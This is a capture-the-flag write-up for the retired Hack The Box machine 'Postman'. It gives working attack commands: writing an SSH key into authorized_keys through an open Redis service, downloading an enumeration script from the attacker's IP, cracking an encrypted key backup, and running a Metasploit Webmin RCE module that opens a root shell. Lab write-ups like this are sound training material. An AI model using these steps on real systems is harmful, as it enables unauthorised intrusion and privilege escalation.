# Postman

This is the write-up for the box Postman that got retired at the 14th March 2020.
My IP address was 10.10.14.14 while I did this.

Let's put this in our hosts file:
```
10.10.10.160    postman.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/postman.nmap 10.10.10.160
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Full TCP port scan:
```
nmap -p- -o nmap/postman_allports 10.10.10.160
```
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt
```

## Checking HTTP (Port 80)

The web page shows a welcome page to _"The Cyber Geek's Personal Website_ and says that it is _"Unter Construction! Coming Soon!"_.
There is nothing interesting in the HTML source code, so lets search for hidden directories with **Gobuster**:
```
gobuster -u http://10.10.10.160 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds no relevant directories.

## Checking HTTP (Port 10000)

The web page on port 10000 shows the following message:
```
Error - Document follows

This web server is running in SSL mode. Try the URL https://Postman:10000/ instead.
```

The hostname _postman_ has to be put in the _/etc/hosts_ file to connect to the HTTPS site.
It then forwards to a [Webmin](https://www.webmin.com/) login form, which is an open source web-based interface for system administration for Unix systems:

![Webmin Login page](postman_web-1.png)

There is no further attack surface here for now.

## Checking Redis (Port 6379)

A connection to the **Redis** service can be established with `nc` and it is possible to use [commands from the Redis documentation](https://redis.io/commands). For example the `INFO` command:
```
nc -v 10.10.10.160 6379

INFO
$2724
# Server
redis_version:4.0.9
(...)
config_file:/etc/redis/redis.conf
```

By installing the _redis-tools_, it is more comfortable to enumerate the service:
```
apt install redis-tools
```
```
redis-cli -h 10.10.10.160
```

With the commands, it is possible to put our own SSH key into the _authorized keys_.

Creating own SSH key:
```
ssh-keygen -f postman
```

The public key has to have two line breaks at the beginning of the file and also two line breaks at the end to successfully write it.

Forwarding the public SSH key to the Redis service:
```
cat postman.pub | redis-cli -h 10.10.10.160 -x set crackit
```

Connecting to the Redis service:
```
redis-cli -h 10.10.10.160
```

Writing the generated SSH key into the _authorized_keys_:
```
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
```

After guessing the username as _redis_, it is possible to SSH into the box:
```
ssh -i postman redis@10.10.10.160
```

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Linux Enumeration script**:
```
wget 10.10.14.14/LinEnum.sh

./LinEnum.sh
```

After enumerating the box, there is a backup of a SSH key found in _/opt/id_rsa.bak_ that is encrypted:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
(...)
```

There is another user on the box called _Matt_ that it could belong to.
Trying to crack it with **John The Ripper**:
```
sshng2john id_rsa.bak > postman_id_rsa.john

john postman_id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
```

It gets cracked and the password for the SSH key is:
> computer2008

With this password, it is possible to switch users to _Matt_:
```
su - Matt
```

### Privilege Escalation to root

The credentials of _Matt_ also work on the **Webmin web interface** that was found earlier.
The version running is **Webmin 1.910**, so lets search for vulnerabilities for that:
```
searchsploit webmin
```
```
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)
```

There is a **Metasploit module** that exploits a remote code execution vulnerability in the _Package Updates_:
```
msf6 > use exploit/linux/http/webmin_packageup_rce

msf6 exploit(linux/http/webmin_packageup_rce) > set LHOST tun0
msf6 exploit(linux/http/webmin_packageup_rce) > set RHOSTS 10.10.10.160
msf6 exploit(linux/http/webmin_packageup_rce) > set USER
msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
msf6 exploit(linux/http/webmin_packageup_rce) > set SSL true

msf6 exploit(linux/http/webmin_packageup_rce) > exploit
```

After running the exploit successfully, it starts a shell session as root!
